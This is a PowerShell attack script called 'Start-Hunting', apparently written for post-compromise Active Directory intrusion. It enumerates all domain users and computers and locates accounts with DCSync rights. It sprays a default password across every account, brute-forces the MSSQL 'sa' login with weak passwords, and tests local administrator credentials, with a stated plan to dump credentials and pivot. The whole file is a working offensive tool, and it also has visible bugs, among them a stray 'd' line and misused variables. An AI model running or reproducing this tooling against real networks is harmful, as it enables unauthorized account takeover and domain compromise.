<# 
	2. Check if user has administrative privilege on some machine
		a. if so, dump credentials, foreach user GOTO 1
#>
<#
    Author: Itamar Mizrahi (@Zecured)
    License: GNU v3
    Required Dependencies: None
    Optional Dependencies: None
#>

function Start-Hunting
{
<#
    .SYNOPSIS
        This tool provides an easy way, once inside a Windows network, to try and achieve a privileged domain user account.
        Author: Itamar Mizrahi (@Zecured)
        License: GNU v3
        Required Dependencies: None
        Optional Dependencies: None
    .DESCRIPTION

    .PARAMETER Password
    Common\Default password to use.
        
    .EXAMPLE 
       
#>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$False, Position=0, ValueFromPipeline=$True)]
        [string]$Password = "Cyber123"

    )

    # Invokes relevant functions
    . .\Test-ADAuthentication.ps1
    . .\Autheticate-SQL.ps1
    . .\Test-Port.ps1
    . .\Test-LocalCredential.ps1
    . .\PowerView.ps1

    Write-Verbose "Querying the forest for all user and computer accounts..."
    $AllUsers = @()
    $AllComputers = @()
    $dcsyncUsers = @()
    $dcs = Get-ADForest | Select-Object -ExpandProperty globalcatalogs
    foreach($dc in $dcs)
    {
        if(Test-Connection -ComputerName $dc -Count 1 -Quiet)
        {
            # Gets all forest users 
            $AllUsers += (Get-ADUser -Filter 'objectclass -eq "user"' -Server $dc)
            # Gets all forest computers
	        $AllComputers += (Get-ADComputer -Filter 'objectclass -eq "computer"' -Server $dc)
            # Gets users with "Replicating Directory Changes All" right
            $splittedDC = $dc.Split(".")
            $1 = $splittedDC[0]
            $2 = $splittedDC[1]
            $3 = $splittedDC[2]
            if($splittedDC.Length -eq 3)
            {
	            $dcsyncUsers = ((Get-Acl 'AD:\DC=$1,DC=$2,DC=$3').access | ?{$_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"} | Select-Object IdentityReference).IdentityReference.value
            }
            else
            {
                $dcsyncUsers = ((Get-Acl 'AD:\DC=$1,DC=$2').access | ?{$_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"} | Select-Object IdentityReference).IdentityReference.value
            }
        }
    }


    # Tries default password, to achieve inital foothold...
    d
    Write-Verbose "Getting a domain user..."

    # Generates userlist
    $verifiedUsers = @()
    foreach($user in $AllUsers)
    {
        $domain = $user.UserPrincipalName.Split("@")[1]
        $username = $domain + '\' + $user.SamAccountName 
        if(Test-ADAuthentication -Username $username -Password $Password)
        {
            $verifiedUsers += $user
        }
    }

    <#Invoke-SMBAutoBrute -UserList $userList -PasswordList $Password -LockoutThreshold 6
    foreach ($user in $AllUsers)
    {
        if($user.Enabled -and -not $user.LockedOut)
        {
            $domainUser = $user.UserPrincipalName.Split("@")[1] + \ + $user.SamAccountName
            if(Test-ADAuthentication $user.SamAccountName $password)
            {
                $verifiedUsers += $user
            }
        }
    }#>


    # Checks if one of the users' found is a member of a privileged group or has "Replicating Directory Changes All" right
    Write-Verbose "Checking the users' found..."
    $Groups = @("admin","privilege")
    $privilegedUsers = @()
    $verifiedDCSyncUsers = @()
    foreach ($user in $verifiedUsers)
    {
        foreach($group in $Groups)
        {
            if($user.MemberOf -like "*$group*")
            {
                $privilegedUsers += $user
            }
        }
        if($dcsyncUsers -contains $user.samAccountName)
        {
            $verifiedDCSyncUsers += $user
        }
    }

    # Searching for MSSQL servers
    Write-Verbose "Searching for SQL servers"
    $sqlServers = @()
    foreach($computer in $AllComputers)
    {
	    if((Test-Port -Computername $computer -Port 1434 -UDP).Open)
	    {
		    $sqlServers += $computer		
	    }
    }
    # Tries weak passwords on "sa" account
    $passwords = @("sa","Password123","") 
    $verifiedSQLUsers = @()

    foreach($server in $sqlServers)
    {
	    foreach($password in $passwords)
	    {	
            if(Autheticate-SQL -ComputerName $server -UserName "sa" -Password $password)
            {
                $verifiedSQLUsers += ($server+'\sa')
            }
	    }
    }

    # Finding local administrators accounts
    Write-Verbose "Searching for local user accounts which belogs to Administrators group..."
    $localAdministrators = @()
    $domain = (Get-NetDomain | Select-Object Forest).Forest.Name
    foreach ($computer in $AllComputers)
    {
    ## TODO
        if((New-Object System.Net.Sockets.TcpClient((Resolve-DnsName $computer.Name).IPAddress,445) -ErrorAction SilentlyContinue -WarningAction SilentlyContinue).Connected)
        {
            $accounts = Get-NetLocalGroup -ComputerName $computer.Name -GroupName Administrators -Recurse -WarningAction SilentlyContinue -ErrorAction SilentlyContinue | where {$_.AccountName -notmatch $domain}
            foreach ($account in $accounts)
            {
                if(Test-LocalCredential -UserName $account -ComputerName $computer.Name -Password $password)
                {
                    $localAdministrators += Get-ADUser $account.AccountName.Split("/")[$account.AccountName.Split("/").Length-1]
                }
            }
        }
    }


    Write-Verbose "Printing results.."
    ### Prints Users Found ###
    Write-Host "Privileged Users: "
    foreach ($user in $privilegedUsers)
    {
	    Write-Host $user.SamAccountName
    }
    Write-Host "DCSync Users: "
    foreach ($user in $verifiedDCSyncUsers)
    {
	    Write-Host $user.SamAccountName
    }
    Write-Host "SQL Users: "
    foreach ($user in $verifiedSQLUsers)
    {
	    Write-Host $user.SamAccountName
    }

}

